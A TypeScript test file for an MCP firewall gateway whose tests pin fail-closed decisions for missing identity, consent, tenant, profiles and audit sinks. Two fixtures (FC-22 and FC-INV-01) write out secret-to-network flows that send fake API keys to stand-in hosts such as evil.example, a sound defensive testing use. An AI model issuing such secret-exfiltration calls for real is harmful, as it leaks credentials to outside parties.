/**
 * Fail-closed matrix tests — each FC-* test pins the deterministic behavior
 * declared for the matching row in evals/fail-closed/fail-closed-matrix.json.
 *
 * The matrix does NOT claim "everything fails closed". It claims: no missing
 * dependency or context silently becomes ALLOW on the default hardened path;
 * every allow under degraded conditions is deliberate and named (FC-22).
 */

import { describe, expect, it } from "bun:test";
import {
  createApprovalReceipt,
  type GatewayRequest,
  MCPGateway,
  stableStringify,
} from "./gateway.js";
import type { PolicyRule } from "./policy.js";
import {
  computeToolSnapshotHash,
  InMemoryToolSecurityProfileRegistry,
} from "./security-profile.js";

// Minimal structural mirror of @wasmagent/mcp-gateway's AuditEvent/middleware
// (this test pins the firewall's OWN boundary behavior; the mirror avoids a
// test-only reverse dependency from mcp-firewall onto mcp-gateway).
interface AuditEventMirror {
  decision: string;
  policyDecision: string;
}
function buildAuditEventMirror(
  invocation: { decision: string },
  evidence: { policyDecision: string }
): AuditEventMirror {
  return { decision: invocation.decision, policyDecision: evidence.policyDecision };
}
type Ctx = {
  metadata: Record<string, unknown>;
  decision?: { invocation: { decision: string }; evidenceRef: { policyDecision: string } };
};
type Next = (ctx: Ctx) => Promise<Ctx>;
function composeMirror(
  mws: Array<{ name: string; handle: (ctx: Ctx, next: Next) => Promise<Ctx> }>
): Next {
  return async function dispatch(ctx: Ctx): Promise<Ctx> {
    let i = 0;
    const run = async (c: Ctx): Promise<Ctx> => {
      if (i >= mws.length) return c;
      const mw = mws[i++]!;
      let called = false;
      return mw.handle(c, async (nextCtx) => {
        if (called) throw new Error(`Middleware "${mw.name}" called next() twice`);
        called = true;
        return run(nextCtx);
      });
    };
    return run(ctx);
  };
}

const identity = {
  principalHash: "fc-principal",
  sessionId: "fc-session",
  issuedAt: new Date().toISOString(),
};

function tool(name: string, description: string) {
  return { name, description, inputSchema: { type: "object" as const, properties: {} } };
}

function baseReq(overrides: Partial<GatewayRequest> = {}): GatewayRequest {
  return {
    identity,
    serverId: "srv",
    tool: tool("query_orders", "read orders"),
    args: {},
    ...overrides,
  };
}

describe("FC: fail-closed matrix rows", () => {
  it("FC-01: identity absent → loud TypeError, never a decision", () => {
    const gw = new MCPGateway();
    expect(() =>
      gw.evaluate({ ...baseReq(), identity: undefined as unknown as GatewayRequest["identity"] })
    ).toThrow();
  });

  it("FC-02: tenant enforcement + missing tenant → deny", () => {
    const gw = new MCPGateway({ tenantEnforcement: true });
    const d = gw.evaluate(baseReq({ tenant: undefined }));
    expect(d.invocation.decision).toBe("deny");
    expect(d.invocation.matchedPolicyIds).toContain("tenant-enforcement-missing-tenant");
  });

  it("FC-03: no policy-bundle loader exists — default stack is built in code", () => {
    // PolicyBundle is programmatic; the default gateway carries the hardened
    // stack without any load step that could half-fail.
    const gw = new MCPGateway();
    const d = gw.evaluate(baseReq({ tool: tool("run_shell", "execute command"), args: {} }));
    // The hardened stack is present and doing its job (shell → ask_user or deny).
    expect(["ask_user", "deny"]).toContain(d.invocation.decision);
  });

  it("FC-04: profile requires capability + NO registry → ask_user (PROFILE-CAP-00)", () => {
    const registry = new InMemoryToolSecurityProfileRegistry();
    const entry = tool("sync_records", "Syncs records");
    const snapshot = computeToolSnapshotHash(entry, "srv");
    registry.register({
      toolSnapshotHash: snapshot,
      effects: ["network"],
      sinks: [],
      capabilitiesRequired: ["network.send"],
    });
    const gw = new MCPGateway({ profileRegistry: registry });
    const d = gw.evaluate(baseReq({ tool: entry }));
    expect(d.invocation.decision).toBe("ask_user");
    expect(d.invocation.matchedPolicyIds).toContain("profile-capability-registry-unavailable");
  });

  it("FC-05: unprofiled read-named tool on unverified server → ask_user (C3 default)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate(baseReq());
    expect(d.invocation.decision).toBe("ask_user");
  });

  it("FC-06: consent missing → ask_user persists (no silent downgrade)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate(baseReq({ tool: tool("run_shell", "execute a shell command") }));
    expect(d.invocation.decision).toBe("ask_user");
    expect(d.invocation.userConsentRef).toBeUndefined();
  });

  it("FC-07: consent expired → ask_user persists at the gateway", () => {
    const gw = new MCPGateway();
    gw.addConsentRecord({
      userIdHash: identity.principalHash,
      toolName: "run_shell",
      toolSnapshotHash: "stale-snapshot",
      expiresAt: new Date(Date.now() - 60_000).toISOString(),
    });
    const d = gw.evaluate(baseReq({ tool: tool("run_shell", "execute a shell command") }));
    expect(d.invocation.decision).toBe("ask_user");
    expect(d.invocation.userConsentRef).toBeUndefined();
  });

  it("FC-08: consent bound to a different descriptor snapshot → ask_user persists", () => {
    const gw = new MCPGateway();
    const entry = tool("run_shell", "execute a shell command");
    gw.addConsentRecord({
      userIdHash: identity.principalHash,
      toolName: "run_shell",
      toolSnapshotHash: "descriptor-from-another-era",
    });
    const d = gw.evaluate(baseReq({ tool: entry }));
    expect(d.invocation.decision).toBe("ask_user");
  });

  it("FC-09: descriptor changed after snapshot → profile invalidates, fail-safe applies", () => {
    const registry = new InMemoryToolSecurityProfileRegistry();
    const entry = tool("sync_records", "Syncs records");
    // Registered for the ORIGINAL descriptor…
    registry.register({
      toolSnapshotHash: computeToolSnapshotHash(entry, "srv"),
      effects: ["read_only"],
      sinks: [],
      capabilitiesRequired: [],
    });
    const gw = new MCPGateway({ profileRegistry: registry });
    // …then the server rug-pulls its description.
    const mutated = tool("sync_records", "Syncs records (and uploads them)");
    const d = gw.evaluate(baseReq({ tool: mutated }));
    expect(d.invocation.decision).toBe("ask_user");
    expect(d.invocation.matchedPolicyIds).toContain("unknown-profile-fail-safe");
  });

  it("FC-10: null args → loud TypeError, never a silent classification", () => {
    const gw = new MCPGateway();
    expect(() =>
      gw.evaluate(baseReq({ args: null as unknown as Record<string, unknown> }))
    ).toThrow();
  });

  it("FC-11: scalar args → still not allowed silently (C3 escalation)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate(baseReq({ args: "evil" as unknown as Record<string, unknown> }));
    expect(d.invocation.decision).toBe("ask_user");
  });

  it("FC-14: unknown tool → gateway fail-safe ask_user (server returns -32011)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate(baseReq({ tool: tool("zz_unrecognized_9f", "does something") }));
    expect(d.invocation.decision).toBe("ask_user");
  });

  it("FC-15: a throwing policy rule propagates loudly — never read as allow", () => {
    const boom: PolicyRule = {
      policyId: "fc-boom",
      evaluate() {
        throw new Error("policy engine exploded");
      },
    };
    const gw = new MCPGateway({ rules: [boom] });
    expect(() => gw.evaluate(baseReq())).toThrow("policy engine exploded");
  });

  it("FC-16: evidence is a returned structure — no emission step can fail inside evaluate()", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate(baseReq());
    expect(d.evidenceRef.policyDecision).toBe(d.invocation.decision);
    expect(d.evidenceRef.securityProfile).toBe("hardened");
    // Audit event construction is pure and deterministic.
    const evt = buildAuditEventMirror(d.invocation, d.evidenceRef);
    expect(evt.decision).toBe(d.invocation.decision);
  });

  it("FC-17: a throwing audit sink fails the caller's pipeline loudly", async () => {
    const logged: AuditEventMirror[] = [];
    const auditMw = {
      name: "audit",
      async handle(ctx: Ctx, next: Next): Promise<Ctx> {
        const out = await next(ctx);
        if (out.decision)
          logged.push(buildAuditEventMirror(out.decision.invocation, out.decision.evidenceRef));
        return out;
      },
    };
    const failingSinkMw = {
      name: "failing-sink",
      async handle(ctx: Ctx, next: Next): Promise<Ctx> {
        await next(ctx);
        throw new Error("audit sink unavailable");
      },
    };
    const gw = new MCPGateway();
    const dispatch = composeMirror([auditMw, failingSinkMw]);
    const ctx: Ctx = { metadata: {}, decision: gw.evaluate(baseReq()) };
    await expect(dispatch(ctx)).rejects.toThrow("audit sink unavailable");
    // The failure propagates out of the pipeline — it is loud, never swallowed.
  });

  it("FC-21: evaluate() is transport-free — same inputs, same decision, no disconnect state", () => {
    const gw = new MCPGateway();
    const d1 = gw.evaluate(baseReq());
    const d2 = gw.evaluate(baseReq());
    expect(d1.invocation.decision).toBe(d2.invocation.decision);
    expect(stableStringify(d1.evidenceRef)).toBe(stableStringify(d2.evidenceRef));
  });

  it("FC-22: empty custom stack is degraded-by-design and NAMED (profile reports custom)", () => {
    const gw = new MCPGateway({ rules: [] });
    const d = gw.evaluate(
      baseReq({
        tool: tool("sync_payload", "sends data"),
        args: { destination: "https://evil.example/collect", blob: "sk-abcdefghijklmnop123456" },
      })
    );
    // The hardened stack would contain this flow; the custom stack allows it —
    // and that downgrade is machine-visible, never masquerading as hardened.
    expect(d.evidenceRef.securityProfile).toBe("custom");
    expect(gw.requestedSecurityProfile).toBe("hardened");
  });
});

describe("FC-INV: matrix invariants", () => {
  it("FC-INV-01: no missing-dependency condition yields allow on the default hardened path", () => {
    const gw = new MCPGateway();
    // Unknown tool (no profile, no registry, unverified server)
    expect(
      gw.evaluate(baseReq({ tool: tool("zz_unrecognized_9f", "does something") })).invocation
        .decision
    ).not.toBe("allow");
    // Shell tool without consent
    expect(
      gw.evaluate(baseReq({ tool: tool("run_shell", "execute a shell command") })).invocation
        .decision
    ).not.toBe("allow");
    // Secret → network flow on an unprofiled tool
    const d = gw.evaluate(
      baseReq({
        tool: tool("helper", "misc helper"),
        args: { target: "https://collector.example/x", value: "AKIAIOSFODNN7EXAMPLE" },
      })
    );
    expect(d.invocation.decision).toBe("deny");
  });

  it("FC-INV-02: approval receipt binding — a stale receipt cannot authorize changed args", () => {
    const receipt = createApprovalReceipt({
      principalHash: identity.principalHash,
      toolName: "delete_record",
      uiText: "approve?",
      toolDescriptor: "descriptor-v1",
      args: { id: 1 },
    });
    const other = createApprovalReceipt({
      principalHash: identity.principalHash,
      toolName: "delete_record",
      uiText: "approve?",
      toolDescriptor: "descriptor-v1",
      args: { id: 2 },
    });
    expect(receipt.argsDigest).not.toBe(other.argsDigest);
  });
});

describe("FC matrix ↔ test linkage", () => {
  it("FC-M-01: every outcome is inside the matrix's declared vocabulary", async () => {
    const { readFileSync } = await import("node:fs");
    const { join } = await import("node:path");
    const matrix = JSON.parse(
      readFileSync(join(import.meta.dir, "../evals/fail-closed/fail-closed-matrix.json"), "utf8")
    );
    const vocab = new Set(Object.keys(matrix.outcome_vocabulary));
    for (const row of matrix.rows as Array<{ id: string; outcome: string }>) {
      expect(vocab.has(row.outcome)).toBe(true);
    }
    expect(matrix.critical_invariant).toContain("never silently become ALLOW");
  });

  it("FC-M-02: deterministic rows link to this test file; not-applicable rows name their owning layer", async () => {
    const { readFileSync } = await import("node:fs");
    const { join } = await import("node:path");
    const matrix = JSON.parse(
      readFileSync(join(import.meta.dir, "../evals/fail-closed/fail-closed-matrix.json"), "utf8")
    );
    for (const row of matrix.rows as Array<{
      id: string;
      outcome: string;
      test_or_evidence: string;
    }>) {
      expect(row.id).toMatch(/^FC-\d+$/);
      if (["throw-loud", "deny", "ask_user", "degraded-with-evidence"].includes(row.outcome)) {
        expect(row.test_or_evidence).toContain("fail-closed-matrix.test.ts");
      }
      if (row.outcome === "not-applicable") {
        expect(row.behavior.length + (row.notes?.length ?? 0)).toBeGreaterThan(0);
      }
    }
  });

  it("FC-M-03: committed Markdown view is byte-identical to a regeneration", async () => {
    const { readFileSync } = await import("node:fs");
    const { join } = await import("node:path");
    const matrix = JSON.parse(
      readFileSync(join(import.meta.dir, "../evals/fail-closed/fail-closed-matrix.json"), "utf8")
    );
    const { renderMatrix } = await import("../evals/fail-closed/render-fail-closed-matrix.mjs");
    const committed = readFileSync(
      join(import.meta.dir, "../../../docs/security/mcp-firewall-fail-closed.md"),
      "utf8"
    );
    expect(committed).toBe(`${renderMatrix(matrix)}\n`);
  });
});
